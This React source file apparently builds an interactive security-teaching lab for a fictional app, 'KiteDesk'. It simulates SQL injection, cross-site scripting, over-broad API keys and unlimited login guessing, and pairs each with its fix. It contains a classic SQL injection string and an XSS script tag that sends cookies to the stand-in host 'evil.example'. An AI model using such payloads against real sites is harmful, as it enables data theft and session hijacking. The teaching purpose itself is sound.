import { useEffect, useRef, useState } from 'react'
import { wait } from '../lib/motion'
import { num } from '../lib/util'
import { LogLine, VulnCase, type VulnApi } from './AttackLab'

/* Attack Lab II — inputs & limits. Fictional sandbox app "KiteDesk".
   Payloads are generic, illustrative and harmless: this shows the idea, not a recipe. */

interface CaseProps {
  onDone?: () => void
}

function useAlive() {
  const alive = useRef(true)
  useEffect(() => {
    alive.current = true
    return () => {
      alive.current = false
    }
  }, [])
  return alive
}

/* ------------------------------------------------------------------ */
/* 5. SQL injection                                                    */
/* ------------------------------------------------------------------ */

const INJECT = "' OR 1=1 --"
const ALL_ROWS = [
  ['1', 'Maya Chen', 'maya@skyline.example', '•••• 4242'],
  ['2', 'Alex Kim', 'alex@bakery.example', '•••• 1881'],
  ['3', 'Priya Shah', 'priya@legal.example', '•••• 0057'],
  ['4', 'Sam Ortiz', 'sam@ortiz.example', '•••• 7310'],
]

export function SqlInjectionCase({ onDone }: CaseProps) {
  const [text, setText] = useState('Maya')
  const [ran, setRan] = useState<null | { text: string; fixed: boolean }>(null)

  function search(api: VulnApi) {
    const fixed = api.fixOn
    setRan({ text, fixed })
    if (text !== INJECT) api.report('normal')
    else api.report(fixed ? 'blocked' : 'breach')
  }

  const injected = ran && ran.text === INJECT && !ran.fixed
  const rows = !ran ? [] : injected ? ALL_ROWS : ran.text === 'Maya' ? [ALL_ROWS[0]] : []

  return (
    <VulnCase
      emoji="💉"
      name="SQL injection"
      intended="A search box finds customers by name. The app pastes whatever you type into a question for the database."
      happened="The quote mark ended the name early, and the rest was read as part of the COMMAND: “…or 1=1” is always true, and “--” means “ignore the rest”. So the database returned every customer."
      fixName="Parameterized queries"
      fixText="Send the command and the user’s text separately. The database treats the text purely as a value to look for — never as instructions."
      blocked="The database looked for a customer literally named “' OR 1=1 --”. There isn’t one, so: 0 rows. Nothing leaked."
      url={() => `kitedesk.example/customers?search=${encodeURIComponent(ran?.text ?? '')}`}
      onDone={onDone}
      sandbox={(api) => (
        <>
          <label className="tiny muted" htmlFor="sqli-field">
            Search customers by name
          </label>
          <div className="row nowrap" style={{ gap: 6 }}>
            <input
              id="sqli-field"
              readOnly
              value={text}
              className="mono grow"
              style={{
                minWidth: 0,
                minHeight: 44,
                padding: '8px 10px',
                borderRadius: 10,
                border: '1.5px solid var(--line)',
                background: 'var(--surface)',
                color: 'var(--ink)',
                fontSize: 15,
              }}
            />
            <button type="button" className="btn small primary" onClick={() => search(api)}>
              Search
            </button>
          </div>
          <div className="row" style={{ gap: 6 }}>
            <span className="tiny muted">Type:</span>
            <button type="button" className="chip mono" aria-pressed={text === 'Maya'} onClick={() => setText('Maya')}>
              Maya
            </button>
            {api.stage >= 1 && (
              <button type="button" className="chip mono" aria-pressed={text === INJECT} onClick={() => setText(INJECT)}>
                {INJECT}
              </button>
            )}
          </div>
          {ran && (
            <div className="stack sm pop" key={`${ran.text}-${ran.fixed}`}>
              <div className="tiny muted">What the database was asked</div>
              {ran.fixed ? (
                <div className="code">
                  {'SELECT * FROM customers\nWHERE name = $1\n'}
                  <span className="good-text">{`$1 = "${ran.text}"  ← just a value`}</span>
                </div>
              ) : (
                <div className="code">
                  {"SELECT * FROM customers\nWHERE name = '"}
                  {injected ? (
                    <>
                      <span className="bad-text" style={{ fontWeight: 700 }}>
                        {"' OR 1=1"}
                      </span>
                      <span className="muted">{" --'"}</span>
                    </>
                  ) : (
                    <>
                      <span style={{ color: 'var(--info)', fontWeight: 700 }}>{ran.text}</span>
                      {"'"}
                    </>
                  )}
                </div>
              )}
              <div className="tiny muted">
                Result: {injected ? `${num(2311)} rows` : `${rows.length} row${rows.length === 1 ? '' : 's'}`}
              </div>
              {rows.length > 0 && (
                <div className="tbl-wrap">
                  <table className="tbl">
                    <thead>
                      <tr>
                        <th>id</th>
                        <th>name</th>
                        <th>email</th>
                        <th>card</th>
                      </tr>
                    </thead>
                    <tbody>
                      {rows.map((r) => (
                        <tr key={r[0]} className={injected ? 'hl-bad' : 'hl-good'}>
                          {r.map((c, i) => (
                            <td key={i}>{c}</td>
                          ))}
                        </tr>
                      ))}
                      {injected && (
                        <tr className="hl-bad">
                          <td colSpan={4}>… and {num(2307)} more customers</td>
                        </tr>
                      )}
                    </tbody>
                  </table>
                </div>
              )}
            </div>
          )}
        </>
      )}
    />
  )
}

/* ------------------------------------------------------------------ */
/* 6. Cross-site scripting (XSS)                                       */
/* ------------------------------------------------------------------ */

const NICE = 'Great support, thanks!'
const EVIL = "<script>sendCookies('evil.example')</script>"

export function XssCase({ onDone }: CaseProps) {
  const alive = useAlive()
  const [draft, setDraft] = useState(NICE)
  const [posts, setPosts] = useState<{ text: string; fixed: boolean }[]>([{ text: 'Loving the new dashboard 🎉', fixed: false }])
  const [log, setLog] = useState<{ tone?: 'good' | 'bad'; text: string }[]>([])

  async function post(api: VulnApi) {
    const fixed = api.fixOn
    const text = draft
    setPosts((p) => [...p.slice(-2), { text, fixed }])
    setLog([])
    if (text !== EVIL) {
      api.report('normal')
      return
    }
    api.setBusy(true)
    await wait(500)
    if (!alive.current) return
    setLog([{ text: '👩‍💼 Admin opens the comment board…' }])
    await wait(800)
    if (!alive.current) return
    if (!fixed) {
      setLog((l) => [...l, { tone: 'bad', text: "⚡ Runs inside Admin’s browser: sendCookies('evil.example')" }])
      await wait(700)
      if (!alive.current) return
      setLog((l) => [...l, { tone: 'bad', text: '→ Admin’s session would be sent to the attacker.' }])
      api.setBusy(false)
      api.report('breach')
    } else {
      setLog((l) => [...l, { tone: 'good', text: 'Shown as plain text. Nothing ran.' }])
      api.setBusy(false)
      api.report('blocked')
    }
  }

  return (
    <VulnCase
      emoji="📝"
      name="Cross-site scripting (XSS)"
      intended="Customers leave comments on a shared board. Everyone, including admins, can read them."
      happened="The app dropped the comment straight into the page, so the browser treated it as CODE, not text. It runs for every person who views the board — including your admin."
      fixName="Escape output (treat it as text)"
      fixText="Display user content as plain text, so “<” is shown as a character, never obeyed. Modern frameworks do this by default — unless someone switches it off."
      blocked="The comment shows up looking odd, but harmless. Text stays text."
      url={() => 'kitedesk.example/board'}
      onDone={onDone}
      sandbox={(api) => (
        <>
          <div className="stack sm">
            {posts.map((p, i) => {
              const ran = p.text === EVIL && !p.fixed
              return (
                <div key={i} className="well pop" style={{ padding: 10, background: ran ? 'var(--bad-soft)' : undefined }}>
                  <div className="tiny muted">💬 Comment</div>
                  {ran ? (
                    <div className="small bad-text" style={{ fontStyle: 'italic' }}>
                      (looks empty — the browser ran it instead of showing it)
                    </div>
                  ) : (
                    <div className={`small ${p.text === EVIL ? 'mono' : ''}`} style={{ overflowWrap: 'anywhere' }}>
                      {p.text}
                    </div>
                  )}
                </div>
              )
            })}
          </div>
          <div className="tiny muted">Write a comment:</div>
          <div className="row" style={{ gap: 6 }}>
            <button type="button" className="chip" aria-pressed={draft === NICE} onClick={() => setDraft(NICE)}>
              {NICE}
            </button>
            {api.stage >= 1 && (
              <button type="button" className="chip mono" aria-pressed={draft === EVIL} onClick={() => setDraft(EVIL)} style={{ overflowWrap: 'anywhere' }}>
                {EVIL}
              </button>
            )}
          </div>
          <button type="button" className="btn small primary block" disabled={api.busy} onClick={() => void post(api)}>
            Post comment
          </button>
          {log.map((l, i) => (
            <LogLine key={i} tone={l.tone}>
              {l.text}
            </LogLine>
          ))}
        </>
      )}
    />
  )
}

/* ------------------------------------------------------------------ */
/* 7. Excessive permissions                                            */
/* ------------------------------------------------------------------ */

const PERMS = [
  { id: 'read-sales', label: 'Read sales numbers', needed: true },
  { id: 'read-customers', label: 'Read customer details', needed: false },
  { id: 'edit', label: 'Edit records', needed: false },
  { id: 'delete', label: 'Delete tables', needed: false },
  { id: 'billing', label: 'Change billing', needed: false },
]

export function PermissionsCase({ onDone }: CaseProps) {
  const alive = useAlive()
  const [report, setReport] = useState(false)
  const [log, setLog] = useState<{ tone?: 'good' | 'bad'; text: string }[]>([])

  async function misuse(api: VulnApi) {
    api.setBusy(true)
    setLog([{ text: 'The bot’s key leaks in a log file. Someone tries: DELETE customers…' }])
    await wait(900)
    if (!alive.current) return
    if (!api.fixOn) {
      setLog((l) => [...l, { tone: 'bad', text: `✓ Deleted ${num(2311)} customer rows.` }])
      api.setBusy(false)
      api.report('breach')
    } else {
      setLog((l) => [...l, { tone: 'good', text: '✕ Denied: this key can only read sales numbers.' }])
      api.setBusy(false)
      api.report('blocked')
    }
  }

  return (
    <VulnCase
      emoji="🎟️"
      name="Excessive permissions"
      intended="A small reporting bot emails you weekly sales. It only needs to READ one table."
      happened="The bot was given an admin key “because it was easier”. The bot did nothing wrong — but when its key leaked, the key could do everything an admin can, including wiping customers."
      fixName="Least privilege"
      fixText="Give the bot its own key that can only read sales numbers. Nothing else."
      blocked="The report still works, and the leaked key can’t delete anything. The damage a mistake can do is capped by what the key is allowed to do."
      url={() => 'kitedesk.example/settings/api-keys'}
      onDone={onDone}
      sandbox={(api) => (
        <>
          <div className="row between">
            <span className="small" style={{ fontWeight: 650 }}>
              🤖 Report bot’s key
            </span>
            <span className="pill" style={{ color: api.fixOn ? 'var(--good)' : 'var(--bad)' }}>
              {api.fixOn ? 'read-only · sales' : 'ADMIN'}
            </span>
          </div>
          <ul className="stack sm" style={{ listStyle: 'none', margin: 0, padding: 0 }}>
            {PERMS.map((p) => {
              const allowed = !api.fixOn || p.needed
              return (
                <li key={p.id} className="row nowrap between small">
                  <span>{p.label}</span>
                  <span className={allowed ? (p.needed ? 'good-text' : 'bad-text') : 'muted'} style={{ fontWeight: 700 }}>
                    {allowed ? '✓ allowed' : '✕ no'}
                  </span>
                </li>
              )
            })}
          </ul>
          <button
            type="button"
            className="btn small block"
            onClick={() => {
              setReport(true)
              api.report('normal')
            }}
          >
            Run the weekly sales report
          </button>
          {report && <LogLine tone="good">✓ Sales this week: $12,480 — emailed to you.</LogLine>}
          {api.stage >= 1 && (
            <button type="button" className="btn small danger block" disabled={api.busy} onClick={() => void misuse(api)}>
              🔓 Misuse the bot’s key
            </button>
          )}
          {log.map((l, i) => (
            <LogLine key={i} tone={l.tone}>
              {l.text}
            </LogLine>
          ))}
        </>
      )}
    />
  )
}

/* ------------------------------------------------------------------ */
/* 8. No rate limiting                                                 */
/* ------------------------------------------------------------------ */

const MATCH_AT = 48_312
const TOTAL = 60_000
const LIMIT = 5

export function RateLimitCase({ onDone }: CaseProps) {
  const alive = useAlive()
  const [normal, setNormal] = useState(false)
  const [tries, setTries] = useState(0)
  const [blockedCount, setBlockedCount] = useState(0)
  const [result, setResult] = useState<null | 'in' | 'stopped'>(null)

  async function bot(api: VulnApi) {
    api.setBusy(true)
    setResult(null)
    setTries(0)
    setBlockedCount(0)
    const fixed = api.fixOn
    const frames = 12
    for (let f = 1; f <= frames; f++) {
      await wait(180)
      if (!alive.current) return
      const sent = Math.round((TOTAL * f) / frames)
      if (!fixed) {
        setTries(Math.min(sent, MATCH_AT))
        if (sent >= MATCH_AT) break
      } else {
        setTries(Math.min(sent, LIMIT))
        setBlockedCount(Math.max(0, sent - LIMIT))
      }
    }
    await wait(300)
    if (!alive.current) return
    api.setBusy(false)
    if (!fixed) {
      setResult('in')
      api.report('breach')
    } else {
      setResult('stopped')
      api.report('blocked')
    }
  }

  return (
    <VulnCase
      emoji="🚦"
      name="No rate limiting"
      intended="The login page lets people try their password. If they mistype, they can try again."
      happened="Nothing limited how fast or how often someone could try. A bot made tens of thousands of guesses in seconds and eventually found Maya’s password."
      fixName="Rate limit logins"
      fixText="Allow 5 tries per account per 15 minutes, then slow down or lock — and alert on floods."
      blocked="After 5 guesses, everything else got “429 Too Many Requests”. At 5 tries per 15 minutes, reaching guess 48,312 would take over 3 months of nonstop trying."
      url={() => 'kitedesk.example/login'}
      onDone={onDone}
      sandbox={(api) => (
        <>
          <button
            type="button"
            className="btn small block"
            onClick={() => {
              setNormal(true)
              api.report('normal')
            }}
          >
            Maya logs in (one typo, then right)
          </button>
          {normal && (
            <>
              <LogLine>✕ Wrong password (try 1)</LogLine>
              <LogLine tone="good">✓ Logged in (try 2)</LogLine>
            </>
          )}
          {api.stage >= 1 && (
            <>
              <div className="divider" />
              <button type="button" className="btn small danger block" disabled={api.busy} onClick={() => void bot(api)}>
                🤖 Start the guessing bot
              </button>
              <div className="grid2">
                <div className="stat">
                  <span className="v">{num(tries)}</span>
                  <span className="l">guesses checked</span>
                </div>
                <div className="stat">
                  <span className={`v ${blockedCount ? 'good-text' : ''}`}>{num(blockedCount)}</span>
                  <span className="l">blocked (429)</span>
                </div>
              </div>
              <div className="meter" aria-hidden="true">
                <span
                  style={{
                    width: `${((api.fixOn ? tries + blockedCount : tries) / TOTAL) * 100}%`,
                    background: api.fixOn ? 'var(--good)' : 'var(--bad)',
                  }}
                />
              </div>
              {result === 'in' && <LogLine tone="bad">✓ MATCH on guess #{num(MATCH_AT)} — Maya’s account taken over.</LogLine>}
              {result === 'stopped' && <LogLine tone="good">Locked after {LIMIT} wrong tries. Alert sent: “Login flood on maya@…”</LogLine>}
            </>
          )}
        </>
      )}
    />
  )
}
